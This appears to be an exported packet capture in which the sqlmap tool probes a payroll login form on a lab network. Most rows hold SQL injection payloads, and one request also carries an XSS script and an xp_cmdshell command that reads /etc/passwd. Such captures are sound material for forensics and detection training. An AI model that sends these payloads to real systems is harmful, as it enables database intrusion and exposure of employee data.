frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data	http.user_agent	http.request.full_uri
7	192.168.1.3	37828	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
9	192.168.2.2	80	192.168.1.3	37828	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
14	192.168.1.3	37826	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
16	192.168.2.2	80	192.168.1.3	37826	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
25	192.168.1.3	37830	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
31	192.168.2.2	80	192.168.1.3	37830	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
37	192.168.1.3	37832	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php?bebQ=8781%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
40	192.168.2.2	80	192.168.1.3	37832	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
49	192.168.1.3	37834	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
55	192.168.2.2	80	192.168.1.3	37834	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
61	192.168.1.3	37836	192.168.2.2	80	user=4390&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
64	192.168.2.2	80	192.168.1.3	37836	\n\n<center><h2>Welcome, 4390</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
73	192.168.1.3	37838	192.168.2.2	80	user=EaKp%29%27%29%28%29%29%28%28%29%22&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
79	192.168.2.2	80	192.168.1.3	37838	\n\n		
85	192.168.1.3	37840	192.168.2.2	80	user=EaKp%27WKPhaO%3C%27%22%3EgQhQlF&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
88	192.168.2.2	80	192.168.1.3	37840	\n\n		
97	192.168.1.3	37842	192.168.2.2	80	user=EaKp%27%29%20AND%203171%3D1899%20AND%20%28%27sKSS%27%3D%27sKSS&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
100	192.168.2.2	80	192.168.1.3	37842	\n\n		
109	192.168.1.3	37846	192.168.2.2	80	user=EaKp%27%29%20AND%203265%3D3265%20AND%20%28%27BjQQ%27%3D%27BjQQ&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
112	192.168.2.2	80	192.168.1.3	37846	\n\n		
124	192.168.1.3	37850	192.168.2.2	80	user=EaKp%27%20AND%203690%3D2575%20AND%20%27Vdvt%27%3D%27Vdvt&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
127	192.168.2.2	80	192.168.1.3	37850	\n\n<center><h2>Welcome, EaKp' AND 3690=2575 AND 'Vdvt'='Vdvt</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
133	192.168.1.3	37848	192.168.2.2	80	user=EaKp%27%20AND%203265%3D3265%20AND%20%27RNbq%27%3D%27RNbq&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
136	192.168.2.2	80	192.168.1.3	37848	\n\n<center><h2>Welcome, EaKp' AND 3265=3265 AND 'RNbq'='RNbq</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
145	192.168.1.3	37852	192.168.2.2	80	user=EaKp%29%20AND%207699%3D3429%20AND%20%288789%3D8789&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
148	192.168.2.2	80	192.168.1.3	37852	\n\n<center><h2>Welcome, EaKp) AND 7699=3429 AND (8789=8789</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
157	192.168.1.3	37854	192.168.2.2	80	user=EaKp%29%20AND%203265%3D3265%20AND%20%285615%3D5615&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
160	192.168.2.2	80	192.168.1.3	37854	\n\n<center><h2>Welcome, EaKp) AND 3265=3265 AND (5615=5615</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
169	192.168.1.3	37856	192.168.2.2	80	user=EaKp%20AND%201130%3D8646&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
172	192.168.2.2	80	192.168.1.3	37856	\n\n<center><h2>Welcome, EaKp AND 1130=8646</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
181	192.168.1.3	37858	192.168.2.2	80	user=EaKp%20AND%203265%3D3265&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
184	192.168.2.2	80	192.168.1.3	37858	\n\n<center><h2>Welcome, EaKp AND 3265=3265</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
193	192.168.1.3	37860	192.168.2.2	80	user=EaKp%20AND%205124%3D8720--%20zEbK&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
196	192.168.2.2	80	192.168.1.3	37860	\n\n<center><h2>Welcome, EaKp AND 5124=8720-- zEbK</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
205	192.168.1.3	37862	192.168.2.2	80	user=EaKp%20AND%203265%3D3265--%20qNWj&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
208	192.168.2.2	80	192.168.1.3	37862	\n\n<center><h2>Welcome, EaKp AND 3265=3265-- qNWj</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
220	192.168.1.3	37866	192.168.2.2	80	user=%28SELECT%20%28CASE%20WHEN%20%282967%3D9301%29%20THEN%20%27EaKp%27%20ELSE%20%28SELECT%209301%20UNION%20SELECT%203183%29%20END%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
223	192.168.2.2	80	192.168.1.3	37866	\n\n		
230	192.168.1.3	37864	192.168.2.2	80	user=%28SELECT%20%28CASE%20WHEN%20%281665%3D1665%29%20THEN%20%27EaKp%27%20ELSE%20%28SELECT%205092%20UNION%20SELECT%209965%29%20END%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
235	192.168.2.2	80	192.168.1.3	37864	\n\n		
241	192.168.1.3	37870	192.168.2.2	80	user=EaKp%27%29%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%28%27swYk%27%3D%27swYk&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
247	192.168.2.2	80	192.168.1.3	37870	\n\n		
254	192.168.1.3	37872	192.168.2.2	80	user=EaKp%27%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%27tzXE%27%3D%27tzXE&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
259	192.168.2.2	80	192.168.1.3	37872	\n\n		
266	192.168.1.3	37874	192.168.2.2	80	user=EaKp%29%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%284270%3D4270&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
271	192.168.2.2	80	192.168.1.3	37874	\n\n<center><h2>Welcome, EaKp) AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871)) AND (4270=4270</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
277	192.168.1.3	37878	192.168.2.2	80	user=EaKp%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
280	192.168.2.2	80	192.168.1.3	37878	\n\n<center><h2>Welcome, EaKp AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871))</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
289	192.168.1.3	37880	192.168.2.2	80	user=EaKp%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29--%20aTHR&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
295	192.168.2.2	80	192.168.1.3	37880	\n\n<center><h2>Welcome, EaKp AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871))-- aTHR</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
301	192.168.1.3	37882	192.168.2.2	80	user=EaKp%27%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27Bocp%27%3D%27Bocp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
305	192.168.2.2	80	192.168.1.3	37882	\n\n		
316	192.168.1.3	37888	192.168.2.2	80	user=EaKp%27%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27jFbe%27%3D%27jFbe&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
319	192.168.2.2	80	192.168.1.3	37888	\n\n		
325	192.168.1.3	37886	192.168.2.2	80	user=EaKp%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285804%3D5804&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
328	192.168.2.2	80	192.168.1.3	37886	\n\n<center><h2>Welcome, EaKp) AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC) AND (5804=5804</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
337	192.168.1.3	37890	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
340	192.168.2.2	80	192.168.1.3	37890	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
352	192.168.1.3	37894	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20RKta&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
355	192.168.2.2	80	192.168.1.3	37894	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- RKta</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
361	192.168.1.3	37892	192.168.2.2	80	user=EaKp%27%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%28%27AKwc%27%3D%27AKwc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
367	192.168.2.2	80	192.168.1.3	37892	\n\n		
373	192.168.1.3	37896	192.168.2.2	80	user=EaKp%27%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%27xFyc%27%3D%27xFyc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
379	192.168.2.2	80	192.168.1.3	37896	\n\n<center><h2>Welcome, EaKp' AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))) AND 'xFyc'='xFyc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
385	192.168.1.3	37898	192.168.2.2	80	user=EaKp%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%281672%3D1672&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
388	192.168.2.2	80	192.168.1.3	37898	\n\n<center><h2>Welcome, EaKp) AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))) AND (1672=1672</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
397	192.168.1.3	37900	192.168.2.2	80	user=EaKp%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
403	192.168.2.2	80	192.168.1.3	37900	\n\n<center><h2>Welcome, EaKp AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113)))</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
409	192.168.1.3	37902	192.168.2.2	80	user=EaKp%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20vZUm&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
412	192.168.2.2	80	192.168.1.3	37902	\n\n<center><h2>Welcome, EaKp AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113)))-- vZUm</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
424	192.168.1.3	37906	192.168.2.2	80	user=EaKp%27%29%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27gOEi%27%3D%27gOEi&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
427	192.168.2.2	80	192.168.1.3	37906	\n\n		
434	192.168.1.3	37904	192.168.2.2	80	user=EaKp%27%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27gNsZ%27%3D%27gNsZ&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
439	192.168.2.2	80	192.168.1.3	37904	\n\n		
445	192.168.1.3	37908	192.168.2.2	80	user=EaKp%29%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287537%3D7537&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
451	192.168.2.2	80	192.168.1.3	37908	\n\n<center><h2>Welcome, EaKp) AND 9408=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9408=9408) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND (7537=7537</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
457	192.168.1.3	37910	192.168.2.2	80	user=EaKp%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
463	192.168.2.2	80	192.168.1.3	37910	\n\n<center><h2>Welcome, EaKp AND 9408=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9408=9408) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
469	192.168.1.3	37912	192.168.2.2	80	user=EaKp%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20AVZE&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
472	192.168.2.2	80	192.168.1.3	37912	\n\n<center><h2>Welcome, EaKp AND 9408=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9408=9408) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)-- AVZE</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
481	192.168.1.3	37914	192.168.2.2	80	user=%28SELECT%20CONCAT%28CONCAT%28%27qjbkq%27%2C%28CASE%20WHEN%20%282393%3D2393%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qbxxq%27%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
484	192.168.2.2	80	192.168.1.3	37914	\n\n		
493	192.168.1.3	37916	192.168.2.2	80	user=EaKp%27%29%3BSELECT%20PG_SLEEP%285%29--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
496	192.168.2.2	80	192.168.1.3	37916	\n\n		
505	192.168.1.3	37918	192.168.2.2	80	user=EaKp%27%3BSELECT%20PG_SLEEP%285%29--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
508	192.168.2.2	80	192.168.1.3	37918	\n\n<center><h2>Welcome, EaKp';SELECT PG_SLEEP(5)--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr>		
517	192.168.1.3	37920	192.168.2.2	80	user=EaKp%29%3BSELECT%20PG_SLEEP%285%29--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
520	192.168.2.2	80	192.168.1.3	37920	\n\n<center><h2>Welcome, EaKp);SELECT PG_SLEEP(5)--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
